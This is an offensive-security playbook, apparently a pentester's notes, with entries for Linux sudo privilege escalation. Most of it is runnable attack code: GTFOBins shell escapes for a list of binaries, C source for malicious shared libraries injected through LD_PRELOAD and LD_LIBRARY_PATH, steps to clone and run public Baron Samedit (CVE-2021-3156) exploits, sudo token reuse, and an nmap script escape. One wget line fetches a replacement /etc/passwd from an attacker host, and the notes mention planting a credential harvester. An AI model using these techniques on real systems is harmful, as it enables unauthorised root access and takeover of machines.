# Linux – Sudo Misconfigurations

### sudo -l Enumeration + GTFOBins Exploitation [added: 2026-04]
- **Tags:** #Sudo #SudoL #GTFOBins #NOPASSWD #PrivEsc #Linux #LinPEAS #SudoAbuse #ShellEscape #SudoersFile
- **Trigger:** `sudo -l` reveals NOPASSWD entries or commands the current user can run as root (or another user); linpeas highlights sudo permissions
- **Prereq:** Low-privilege shell; sudo access to one or more commands (check with `sudo -l`); the allowed binary has a known GTFOBins sudo exploit
- **Yields:** Root shell or command execution as root (or the target user specified in the sudoers entry)
- **Opsec:** Low
- **Context:** Misconfigured sudoers entries are one of the most common Linux privesc vectors. Admins often grant NOPASSWD access to utilities they consider harmless, but many standard binaries can break out to a shell. Always run `sudo -l` immediately after getting a shell and cross-reference every allowed binary against GTFOBins.
- **Payload/Method:**
```bash
# Step 1: Enumerate sudo permissions
sudo -l
# Look for: (root) NOPASSWD: /usr/bin/vim
# Or: (ALL) /usr/bin/less, /usr/bin/find, etc.

# Step 2: Exploit based on allowed binary

# vim / vi
sudo vim -c ':!/bin/bash'

# less / more
sudo less /etc/hosts
# Then type: !/bin/bash

# find
sudo find / -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (older with --interactive)
sudo nmap --interactive
!sh

# env
sudo env /bin/bash

# man
sudo man man
# Then type: !/bin/bash

# perl
sudo perl -e 'exec "/bin/bash";'

# python/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# ftp
sudo ftp
!/bin/bash

# zip
sudo zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/bash"

# apache2 (read arbitrary files via error message)
sudo apache2 -f /etc/shadow

# wget (overwrite files — e.g., overwrite /etc/passwd)
# On attacker: python3 -m http.server 80 (serve modified passwd)
sudo wget http://ATTACKER_IP/passwd -O /etc/passwd

# Full GTFOBins reference: https://gtfobins.github.io/#+sudo
```

### Sudo env_keep LD_PRELOAD Exploitation [added: 2026-04]
- **Tags:** #LD_PRELOAD #EnvKeep #SudoAbuse #SharedLibrary #PrivEsc #Linux #DynamicLinker #LD_LIBRARY_PATH #LinPEAS
- **Trigger:** `sudo -l` output includes `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH`; linpeas flags this as a privesc vector
- **Prereq:** Sudo access to at least one command (even innocuous); `env_keep` in sudoers preserves LD_PRELOAD or LD_LIBRARY_PATH; gcc or a way to transfer a pre-compiled .so to the target
- **Yields:** Root shell by injecting a malicious shared library into the sudo-executed process
- **Opsec:** Med
- **Context:** When `env_keep+=LD_PRELOAD` is present in the sudoers configuration, the LD_PRELOAD variable persists through sudo. This allows you to force any sudo-executed binary to load your malicious shared library first. The library's constructor function runs before main(), giving you code execution as root. This also works with LD_LIBRARY_PATH if a sudo-allowed binary loads a shared library you can replace.
- **Payload/Method:**
```bash
# Step 1: Verify env_keep includes LD_PRELOAD
sudo -l
# Output includes: env_keep+=LD_PRELOAD
# And allows: (root) NOPASSWD: /usr/bin/apache2  (or any command)

# Step 2: Compile malicious shared library
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# Step 3: Execute any allowed sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/apache2

# --- LD_LIBRARY_PATH variant ---
# If env_keep+=LD_LIBRARY_PATH instead:
# Step 1: Find shared libraries loaded by the allowed binary
ldd /usr/bin/apache2
# Example output: libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1

# Step 2: Create malicious library with the same name
cat > /tmp/libcrypt.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/libcrypt.so.1 /tmp/libcrypt.c

# Step 3: Run with LD_LIBRARY_PATH pointing to /tmp
sudo LD_LIBRARY_PATH=/tmp /usr/bin/apache2
```

### Sudo Version Exploit – CVE-2021-3156 Baron Samedit [added: 2026-04]
- **Tags:** #BaronSamedit #CVE-2021-3156 #SudoExploit #HeapOverflow #PrivEsc #Linux #SudoEdit #VersionExploit #KernelExploit #BufferOverflow
- **Trigger:** `sudo --version` shows sudo version < 1.9.5p2 (affected: 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1); or automated scanners flag CVE-2021-3156
- **Prereq:** Low-privilege shell; vulnerable sudo version installed; any local user account (does NOT require sudo privileges — this is an unprivileged exploit); target architecture must match the exploit variant (x86_64, i386, etc.)
- **Yields:** Root shell via heap-based buffer overflow in sudoedit
- **Opsec:** High
- **Context:** Baron Samedit (CVE-2021-3156) is a heap-based buffer overflow in sudo's sudoedit mode. It affects nearly all default sudo installations from July 2011 to January 2021. The vulnerability is triggered by passing a backslash-terminated argument to sudoedit. This is one of the most reliable local privilege escalation exploits in recent Linux history, and multiple public PoCs exist. No sudo access is required — any unprivileged local user can exploit it.
- **Payload/Method:**
```bash
# Step 1: Check sudo version
sudo --version
# Vulnerable if: Sudo version 1.8.2 - 1.8.31p2 or 1.9.0 - 1.9.5p1

# Step 2: Quick vulnerability check (non-destructive)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If it segfaults or says "sudoedit: \" → likely vulnerable
# If it says "usage:" → patched

# Step 3: Use public exploit
# Option A: bl4sty's exploit (most reliable)
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
# List available targets
./sudo-hax-me-a-sandwich
# Run with target number (e.g., 0 for Ubuntu 20.04)
./sudo-hax-me-a-sandwich 0

# Option B: worawit's Python exploit
git clone https://github.com/worawit/CVE-2021-3156.git
cd CVE-2021-3156
python3 exploit_nss.py

# If no compiler on target, compile on attacker with matching arch:
# gcc -o exploit exploit.c -static
# Transfer to target and execute

# Step 4: Verify root
id
whoami
```

### Sudo Token Reuse / timestamp_timeout Abuse [added: 2026-04]
- **Tags:** #SudoToken #TimestampTimeout #SudoCache #PrivEsc #Linux #TokenReuse #SudoSession #tty_tickets #ProcSnoop
- **Trigger:** Another user (or the same user in a different session) recently used sudo successfully; or `cat /proc/sys/kernel/yama/ptrace_scope` returns 0; or `/var/run/sudo/ts/` or `/run/sudo/ts/` contains recent timestamp files
- **Prereq:** Low-privilege shell as a user who has sudo privileges AND has used sudo recently (within the timeout window, default 15 minutes); OR ptrace_scope=0 and ability to attach to another user's process that has a valid sudo token
- **Yields:** Sudo command execution without knowing the user's password, leveraging the cached authentication token
- **Opsec:** Low
- **Context:** After a user successfully authenticates with sudo, a timestamp token is cached (default: 15 minutes). If `tty_tickets` is disabled in sudoers (older systems), the token is shared across all TTYs for that user, meaning any session as that user can use sudo without re-authenticating. Even with `tty_tickets` enabled, if ptrace_scope=0, you may be able to inject into an existing process that has a valid sudo context. Always check timestamp files and ptrace scope on target.
- **Payload/Method:**
```bash
# Step 1: Check if sudo tokens exist and are recent
ls -la /var/run/sudo/ts/ 2>/dev/null || ls -la /run/sudo/ts/ 2>/dev/null
# Files here with recent timestamps indicate cached sudo sessions

# Step 2: Check tty_tickets setting
sudo -l 2>/dev/null | grep -i "tty_tickets"
cat /etc/sudoers 2>/dev/null | grep -i "tty_tickets"
# If "!tty_tickets" is set → token is shared across all TTYs

# Step 3: Check timestamp_timeout
cat /etc/sudoers 2>/dev/null | grep -i "timestamp_timeout"
# Default is 15 minutes; some configs set it much higher or to -1 (never expire)

# Step 4: If you are the same user who recently sudo'd (and !tty_tickets):
sudo -n id
# -n = non-interactive; if token is valid, this runs without prompting

# If successful, use sudo for escalation:
sudo /bin/bash

# Step 5: Check ptrace scope for cross-process token theft
cat /proc/sys/kernel/yama/ptrace_scope
# 0 = no restriction (can ptrace any process owned by same user)

# Step 6: Automated exploitation with sudo_killer or similar
# https://github.com/TH3xACE/SUDO_KILLER
# Upload and run:
./sudo_killer.sh -c -e -r report.txt

# Manual: if you can write to a user's .bashrc and they run sudo later
echo 'alias sudo="sudo "'  >> ~/.bashrc  # Ensures alias expansion
# Or plant a credential harvester (opsec: high)
```

### nmap --script Lua os.execute PrivEsc [added: 2026-04]
- **Tags:** #Sudo #nmap #GTFOBins #PrivEsc #Lua #ScriptEngine
- **Trigger:** `sudo -l` shows `(root) NOPASSWD: /usr/bin/nmap`
- **Prereq:** Shell as non-root user; nmap sudoable without password
- **Yields:** Root shell via nmap Lua NSE script engine
- **Opsec:** Low
- **Context:** Zabbix, monitoring agents, and other services may grant nmap sudo for host detection. The NSE Lua engine runs as the sudo user.
- **Payload/Method:**
  ```bash
  TF=$(mktemp)
  echo 'os.execute("/bin/sh")' > $TF
  sudo nmap --script=$TF
  ```
